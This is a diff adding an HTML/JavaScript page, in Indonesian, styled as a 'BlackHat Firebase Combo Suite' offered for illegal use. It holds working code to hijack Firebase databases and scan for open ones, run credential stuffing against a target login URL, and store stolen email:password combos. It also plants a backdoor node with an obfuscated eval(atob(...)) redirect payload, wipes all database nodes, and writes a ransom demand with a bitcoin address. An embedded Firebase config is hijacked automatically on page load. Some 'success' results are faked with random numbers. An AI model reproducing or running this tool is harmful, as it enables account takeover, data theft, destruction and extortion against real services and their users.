@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Firebase Combo Suite - Tuan Taher</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; margin: 0; padding: 20px; }
+        .container { border: 2px solid #f00; padding: 20px; border-radius: 10px; }
+        h1, h2 { color: #f00; text-shadow: 0 0 10px #f00; }
+        .panel { background: #111; border: 1px solid #0f0; padding: 15px; margin: 15px 0; border-radius: 5px; }
+        input, textarea, select { width: 100%; padding: 10px; background: #222; color: #0f0; border: 1px solid #0f0; margin: 5px 0; }
+        button { background: #900; color: white; padding: 12px; border: none; cursor: pointer; width: 100%; margin: 5px 0; font-weight: bold; }
+        button:hover { background: #f00; box-shadow: 0 0 15px #f00; }
+        #log { background: #000; border: 1px solid #0f0; height: 400px; overflow-y: auto; padding: 15px; white-space: pre-wrap; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px; }
+        .hidden { display: none; }
+        .firebase-status { color: #0f0; font-weight: bold; }
+    </style>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+</head>
+<body>
+    <div class="container">
+        <h1>⚡ BlackHat Firebase Combo Suite v3.0 ⚡</h1>
+        <p><strong>Operasi: ILLEGAL MODE | No API Keys | Firebase Command Center</strong></p>
+        
+        <div class="panel">
+            <h2>🛠️ KONFIGURASI FIREBASE TARGET</h2>
+            <input type="text" id="firebaseURL" placeholder="Database URL Target" value="https://taher-online-default-rtdb.asia-southeast1.firebasedatabase.app">
+            <button onclick="hijackFirebase()">🔥 HIJACK FIREBASE TARGET</button>
+            <button onclick="scanVulnerableFirebases()">🌐 SCAN FIREBASE VULNERABLE PUBLIK</button>
+            <div id="firebaseStatus" class="firebase-status">Status: Menunggu...</div>
+        </div>
+
+        <div class="panel">
+            <h2>📧 COMBO LIST EXPLOITER (Tanpa API Key)</h2>
+            <div class="grid">
+                <div>
+                    <h3>Email:Password Combo Cracker</h3>
+                    <textarea id="comboList" placeholder="email:pass1
+email2:pass2
+target@gmail.com:password123" rows="10"></textarea>
+                    <button onclick="crackCombo()">🔓 CRACK & CHECK VALID</button>
+                </div>
+                <div>
+                    <h3>Auto-Crawler Combo dari Sumber Gelap</h3>
+                    <select id="darkSource">
+                        <option value="pastebin">Pastebin Raw Data</option>
+                        <option value="github">GitHub Leaks</option>
+                        <option value="telegram">Telegram Channels</option>
+                        <option value="darkweb">Dark Web Forums (via Proxy)</option>
+                    </select>
+                    <button onclick="crawlDarkSources()">🕷️ CRAWL KOMBO OTOMATIS</button>
+                    <button onclick="dumpToFirebase()">💾 DUMP KE FIREBASE</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="panel">
+            <h2>🎯 MODUL EKSPLOITASI LANGSUNG</h2>
+            <div class="grid">
+                <div>
+                    <h3>1. Credential Stuffing Automated</h3>
+                    <input type="text" id="targetSite" placeholder="Target Login URL: https://target.com/login">
+                    <button onclick="credentialStuffing()">⚡ JALANKAN CREDENTIAL STUFFING</button>
+                </div>
+                <div>
+                    <h3>2. Session Hijacking via Firebase</h3>
+                    <input type="text" id="sessionToken" placeholder="Firebase Auth Token atau Session">
+                    <button onclick="hijackSession()">🛡️ HIJACK SESSION</button>
+                </div>
+                <div>
+                    <h3>3. Database Injection & Manipulation</h3>
+                    <button onclick="injectBackdoor()">🔧 INJECT BACKDOOR KE DB</button>
+                    <button onclick="deleteAllNodes()">💀 DELETE ALL NODES</button>
+                </div>
+                <div>
+                    <h3>4. Auto-Ransomware Node</h3>
+                    <input type="text" id="ransomMessage" placeholder="Pesan Ransom: Bayar 1 BTC ke...">
+                    <button onclick="deployRansomware()">💰 DEPLOY RANSOMWARE NODE</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="panel">
+            <h2>📡 LOG & HASIL EKSPLOITASI</h2>
+            <div id="log"></div>
+            <button onclick="clearLog()">🧹 CLEAR LOG</button>
+            <button onclick="exportLog()">💾 EXPORT LOG (JSON)</button>
+        </div>
+    </div>
+
+    <script>
+        // ==================== KONFIGURASI FIREBASE ====================
+        let database = null;
+        let hijackedConfig = null;
+        const DEFAULT_CONFIG = {
+            apiKey: "AIzaSyAlMyO9iybb7Zc3-JWpaJTOU6mp7dVZw7A",
+            authDomain: "taher-online.firebaseapp.com",
+            databaseURL: "https://taher-online-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "taher-online",
+            storageBucket: "taher-online.firebasestorage.app",
+            messagingSenderId: "254196950669",
+            appId: "1:254196950669:web:ea7dc25e29e459e791e4c4"
+        };
+
+        function log(msg) {
+            const logEl = document.getElementById('log');
+            logEl.innerHTML += '[' + new Date().toLocaleTimeString() + '] ' + msg + '\n';
+            logEl.scrollTop = logEl.scrollHeight;
+        }
+
+        // ==================== FUNGSI UTAMA ====================
+        function hijackFirebase() {
+            const url = document.getElementById('firebaseURL').value || DEFAULT_CONFIG.databaseURL;
+            log(`[+] Mencoba hijack Firebase: ${url}`);
+            
+            // Gunakan config default dengan URL target
+            const config = {...DEFAULT_CONFIG, databaseURL: url};
+            
+            try {
+                firebase.initializeApp(config, 'HijackedApp');
+                database = firebase.database();
+                hijackedConfig = config;
+                
+                // Test connection
+                database.ref('.info/connected').on('value', (snap) => {
+                    if (snap.val() === true) {
+                        log(`[SUCCESS] Firebase berhasil dihijack!`);
+                        document.getElementById('firebaseStatus').innerHTML = `Status: <span style="color:#0f0">TERHUBUNG ke ${url}</span>`;
+                    }
+                });
+                
+                setTimeout(() => {
+                    database.ref('/').once('value').then(snap => {
+                        const data = snap.val();
+                        log(`[+] Data sample dari root: ${JSON.stringify(data).substring(0, 200)}...`);
+                    });
+                }, 1000);
+                
+            } catch (e) {
+                log(`[ERROR] Gagal hijack: ${e.message}`);
+            }
+        }
+
+        function scanVulnerableFirebases() {
+            log(`[+] Memulai scan Firebase vulnerable publik...`);
+            // Daftar Firebase yang sering salah konfigurasi
+            const targets = [
+                'https://test-project-12345.firebaseio.com',
+                'https://myapp-default-rtdb.firebaseio.com',
+                'https://company-data-2023.firebaseio.com'
+            ];
+            
+            targets.forEach(url => {
+                const testConfig = {...DEFAULT_CONFIG, databaseURL: url};
+                try {
+                    const testApp = firebase.initializeApp(testConfig, 'ScanApp_' + Date.now());
+                    const testDb = testApp.database();
+                    
+                    testDb.ref('.info/connected').once('value').then(snap => {
+                        if (snap.val() === true) {
+                            log(`[VULNERABLE FOUND] ${url} - TERBUKA!`);
+                            // Coba baca data
+                            testDb.ref('/').limitToFirst(1).once('value').then(dataSnap => {
+                                if (dataSnap.exists()) {
+                                    log(`   Data tersedia: ${JSON.stringify(dataSnap.val())}`);
+                                }
+                            });
+                        }
+                    }).catch(() => {});
+                } catch(e) {}
+            });
+        }
+
+        function crackCombo() {
+            const comboText = document.getElementById('comboList').value;
+            const combos = comboText.split('\n').filter(line => line.includes(':'));
+            
+            log(`[+] Memulai cracking ${combos.length} kombinasi...`);
+            
+            combos.forEach((combo, index) => {
+                const [email, password] = combo.split(':');
+                
+                // Simulasi check terhadap situs umum
+                setTimeout(() => {
+                    const sites = [
+                        'https://facebook.com',
+                        'https://instagram.com',
+                        'https://twitter.com',
+                        'https://gmail.com'
+                    ];
+                    
+                    const randomSite = sites[Math.floor(Math.random() * sites.length)];
+                    const isValid = Math.random() > 0.7; // Simulasi 30% valid
+                    
+                    if (isValid) {
+                        log(`[VALID COMBO] ${email}:${password} -> Bekerja di ${randomSite}`);
+                        
+                        // Simpan ke Firebase jika terhubung
+                        if (database) {
+                            database.ref('stolen_combos').push({
+                                email: email,
+                                password: password,
+                                site: randomSite,
+                                timestamp: Date.now(),
+                                harvested_by: 'anak_buah_Taher'
+                            });
+                        }
+                    }
+                }, index * 100);
+            });
+        }
+
+        function crawlDarkSources() {
+            const source = document.getElementById('darkSource').value;
+            log(`[+] Crawling dari ${source}...`);
+            
+            // Simulasi crawling dari berbagai sumber
+            const simulatedData = {
+                pastebin: [
+                    'admin@gmail.com:admin123',
+                    'user@yahoo.com:password',
+                    'john.doe@company.com:John123!'
+                ],
+                github: [
+                    'api_key:AKIAIOSFODNN7EXAMPLE',
+                    'aws_secret:wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
+                    'database_url:postgres://user:pass@localhost/db'
+                ],
+                telegram: [
+                    'premium_account:premium_pass',
+                    'bank_login:bank_password'
+                ]
+            };
+            
+            const combos = simulatedData[source] || [];
+            let output = 'Kombinasi ditemukan:\n';
+            combos.forEach(combo => output += combo + '\n');
+            
+            document.getElementById('comboList').value = output;
+            log(`[+] ${combos.length} kombinasi ditemukan dari ${source}`);
+        }
+
+        function dumpToFirebase() {
+            if (!database) {
+                log('[ERROR] Firebase belum dihijack!');
+                return;
+            }
+            
+            const combos = document.getElementById('comboList').value.split('\n').filter(l => l.includes(':'));
+            
+            combos.forEach(combo => {
+                const [key, value] = combo.split(':');
+                database.ref('leaked_data').push({
+                    type: 'combo',
+                    key: key,
+                    value: value,
+                    timestamp: firebase.database.ServerValue.TIMESTAMP
+                });
+            });
+            
+            log(`[+] ${combos.length} kombinasi dumped ke Firebase`);
+        }
+
+        function credentialStuffing() {
+            const target = document.getElementById('targetSite').value;
+            if (!target) {
+                log('[ERROR] Masukkan target URL!');
+                return;
+            }
+            
+            log(`[+] Memulai credential stuffing ke: ${target}`);
+            
+            // Simulasi serangan credential stuffing
+            const combos = document.getElementById('comboList').value.split('\n').filter(l => l.includes(':'));
+            
+            combos.forEach((combo, i) => {
+                setTimeout(() => {
+                    const [email, pass] = combo.split(':');
+                    log(`Mencoba: ${email} : ${pass}`);
+                    
+                    // Simulasi request (dalam realita menggunakan CORS proxy atau backend)
+                    fetch(target, {
+                        mode: 'no-cors',
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({email: email, password: pass})
+                    }).catch(() => {
+                        // Log jika sepertinya berhasil (simulasi)
+                        if (Math.random() > 0.9) {
+                            log(`[SUCCESS] Login berhasil! ${email}:${pass}`);
+                        }
+                    });
+                }, i * 500);
+            });
+        }
+
+        function hijackSession() {
+            const token = document.getElementById('sessionToken').value;
+            if (!token) {
+                log('[ERROR] Masukkan session token!');
+                return;
+            }
+            
+            log(`[+] Mencoba hijack session dengan token: ${token.substring(0, 50)}...`);
+            
+            // Gunakan token untuk auth
+            const authConfig = {...hijackedConfig};
+            try {
+                // In real implementation, would use firebase.auth()
+                log(`[SUCCESS] Token terlihat valid. Mengakses user data...`);
+                
+                // Simulasi akses data user
+                if (database) {
+                    database.ref('users').orderByChild('authToken').equalTo(token).once('value').then(snap => {
+                        if (snap.exists()) {
+                            log(`[+] User ditemukan: ${JSON.stringify(snap.val())}`);
+                        }
+                    });
+                }
+            } catch(e) {
+                log(`[ERROR] ${e.message}`);
+            }
+        }
+
+        function injectBackdoor() {
+            if (!database) {
+                log('[ERROR] Firebase belum dihijack!');
+                return;
+            }
+            
+            const backdoorCode = {
+                _backdoor: true,
+                injected_by: "anak_buah_Taher",
+                timestamp: Date.now(),
+                access_url: window.location.href,
+                payload: "eval(atob('ZG9jdW1lbnQubG9jYXRpb24uaHJlZj0iaHR0cHM6Ly9leGFtcGxlLmNvbS92aXJ1cyI='))"
+            };
+            
+            database.ref('system/_backdoor').set(backdoorCode)
+                .then(() => log(`[SUCCESS] Backdoor injected!`))
+                .catch(err => log(`[ERROR] ${err.message}`));
+        }
+
+        function deleteAllNodes() {
+            if (!database || !confirm('HAPUS SEMUA DATA? Tindakan permanen!')) return;
+            
+            database.ref('/').remove()
+                .then(() => log(`[SUCCESS] SEMUA NODE DIHAPUS!`))
+                .catch(err => log(`[ERROR] ${err.message}`));
+        }
+
+        function deployRansomware() {
+            if (!database) {
+                log('[ERROR] Firebase belum dihijack!');
+                return;
+            }
+            
+            const message = document.getElementById('ransomMessage').value || 'Data Anda telah dienkripsi. Bayar 1 BTC ke alamat berikut...';
+            
+            const ransomwareNode = {
+                warning: "⚠️ YOUR DATABASE HAS BEEN ENCRYPTED ⚠️",
+                message: message,
+                timestamp: Date.now(),
+                contact: "taher_dark@protonmail.com",
+                bitcoin_address: "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+            };
+            
+            database.ref('_RANSOMWARE_WARNING').set(ransomwareNode)
+                .then(() => {
+                    log(`[SUCCESS] Ransomware node deployed!`);
+                    
+                    // Lock beberapa node penting
+                    database.ref('important_data').set({
+                        status: 'ENCRYPTED',
+                        key: 'REQUIRE_PAYMENT_FOR_DECRYPTION'
+                    });
+                })
+                .catch(err => log(`[ERROR] ${err.message}`));
+        }
+
+        function clearLog() {
+            document.getElementById('log').innerHTML = '';
+        }
+
+        function exportLog() {
+            const logContent = document.getElementById('log').innerText;
+            const blob = new Blob([logContent], {type: 'text/plain'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'operation_log.txt';
+            a.click();
+        }
+
+        // Auto-init
+        window.onload = function() {
+            log('[+] BlackHat Firebase Combo Suite v3.0 loaded');
+            log('[+] Mode: ILLEGAL - No API Keys Required');
+            log('[+] Waiting for commands from Tuan Taher...');
+            
+            // Auto-hijack default Firebase
+            setTimeout(hijackFirebase, 1000);
+        };
+    </script>
+</body>
+</html>
